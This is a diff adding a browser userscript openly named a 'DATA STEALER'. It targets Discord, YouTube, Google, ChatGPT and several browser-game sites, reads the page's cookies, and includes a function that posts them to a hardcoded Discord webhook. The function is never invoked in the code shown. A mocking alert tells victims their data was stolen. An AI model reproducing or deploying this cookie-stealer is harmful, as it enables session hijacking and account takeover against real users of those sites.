@@ -1,0 +1,39 @@
+// ==UserScript==
+// @name         New Userscript DATA STEALER
+// @namespace    http://tampermonkey.net/
+// @version      2026-05-30
+// @description  try to take over the world!
+// @author       You
+// @match        https://kirka.io/*
+// @match        https://bloxd.io/*
+// @match        https://youtube.com/*
+// @match        https://discord.com/*
+// @match        https://google.com/*
+// @match        https://chatgpt.com\*
+// @match        https://playbloxd.io/*
+// @match        https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg/*
+// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @grant        none
+// ==/UserScript==
+var _LOL;
+(function LOL() {
+    
+        let dadaStealing = false;
+        var _LOL = document.cookie;
+        console.log('STEALED DATA:', _LOL);
+        function HAHA() {
+            var WebHook = 'https://discord.com/api/webhooks/1510424027674447872/C04p4PSXFe8K4C6Cy8-TLFz5u7RgYZMp-MvWWeA1afByEprrmvHOAUY_v9NHroOJg8-f';
+            fetch(WebHook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type' : 'application/json'
+                },
+                body: JSON.stringify({
+                    username: 'all DATA Stealed',
+                    content: _LOL
+                })
+            });
+        }
+        console.log(_LOL);
+        alert('all Data is succefully stealed✅ and sended to cartoonbloxd !!!');
+})();
